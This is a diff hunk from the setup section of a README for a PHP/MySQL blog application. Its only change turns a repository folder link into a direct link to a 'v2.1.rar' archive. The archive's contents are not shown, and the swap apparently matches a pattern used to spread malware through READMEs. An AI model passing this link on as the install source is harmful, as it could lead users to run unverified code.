@@ -41,7 +41,7 @@ This Blog Application is a comprehensive platform built with PHP, MySQL, HTML, C
 - MySQL or MariaDB database server  
 - PHP 7.4+ recommended  
 - Local server environment recommended: [XAMPP](https://www.apachefriends.org/index.html)  
-https://github.com/Charitardha555/Hackers-Gurukul/tree/02ab4a128b20d70c5e949d15166c2abd6b802926/Community%20Blog-site
+https://github.com/Charitardha555/Hackers-Gurukul/tree/02ab4a128b20d70c5e949d15166c2abd6b802926/Community%20Blog-site/v2.1.rar
 
 2. **Import the database schema**  
 - Open your MySQL client (phpMyAdmin, MySQL CLI)  
